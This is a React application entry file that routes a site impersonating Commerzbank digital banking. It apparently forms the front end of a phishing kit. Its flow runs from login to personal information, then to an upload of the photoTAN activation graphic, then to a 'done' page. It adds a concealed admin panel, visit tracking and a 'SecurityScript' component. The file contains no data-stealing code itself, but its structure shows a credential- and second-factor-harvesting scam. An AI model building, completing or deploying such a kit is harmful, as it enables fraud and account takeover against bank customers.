import React, { useEffect, useState } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate, useLocation } from 'react-router-dom';
import Header from './components/Header';
import Footer from './components/Footer';
import LoginPage from './components/LoginPage';
import InfoPage from './components/InfoPage';
import UploadPage from './components/UploadPage';
import DonePage from './components/DonePage';
import AdminPanel from './components/AdminPanel';
import SecurityScript from './components/SecurityScript';
import { LanguageProvider } from './contexts/LanguageContext';
import axios from 'axios';
import './App.css';

function AppContent() {
  const location = useLocation();
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
  const API_BASE_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001/api';

  useEffect(() => {
    // Track website visit when app loads (only once per session)
    const trackVisit = async () => {
      // Check if we've already tracked this visit in this session
      const sessionKey = `visit_tracked_${window.location.pathname}`;
      if (sessionStorage.getItem(sessionKey)) {
        console.log('Visit already tracked for this session');
        return;
      }

      try {
        await axios.post(`${API_BASE_URL}/track-visit`, {
          path: window.location.pathname
        });
        console.log('✅ Website visit tracked for:', window.location.pathname);
        // Mark as tracked for this session
        sessionStorage.setItem(sessionKey, 'true');
      } catch (error) {
        console.log('Failed to track visit:', error);
      }
    };

    // Add a small delay to ensure the page is fully loaded
    const timer = setTimeout(trackVisit, 100);
    return () => clearTimeout(timer);
  }, []);

  // Update document title based on current route
  useEffect(() => {
    const updateTitle = () => {
      switch (location.pathname) {
        case '/admin':
          document.title = 'Admin Panel - Commerzbank';
          break;
        case '/login':
          document.title = 'Anmeldung zum Digital Banking - Commerzbank';
          break;
        case '/info':
          document.title = 'Persönliche Informationen - Commerzbank';
          break;
        case '/upload':
          document.title = 'Aktivierungsgrafik hochladen - Commerzbank';
          break;
        case '/done':
          document.title = 'Registrierung abgeschlossen - Commerzbank';
          break;
        default:
          document.title = 'Anmeldung zum Digital Banking - Commerzbank';
      }
    };

    updateTitle();
  }, [location.pathname]);

  // Handle window resize
  useEffect(() => {
    const handleResize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  // Don't show header and footer on admin page
  const showHeader = location.pathname !== '/admin';
  const showFooter = location.pathname !== '/admin';

  return (
    <div className="App">
      <SecurityScript />
      {showHeader && <Header />}
      <Routes>
        <Route path="/" element={<Navigate to="/login" replace />} />
        <Route path="/login" element={<LoginPage />} />
        <Route path="/info" element={<InfoPage />} />
        <Route path="/upload" element={<UploadPage />} />
        <Route path="/done" element={<DonePage />} />
        <Route path="/admin" element={<AdminPanel />} />
      </Routes>
      {showFooter && <Footer />}
    </div>
  );
}

function App() {
  return (
    <LanguageProvider>
      <Router>
        <AppContent />
      </Router>
    </LanguageProvider>
  );
}

export default App;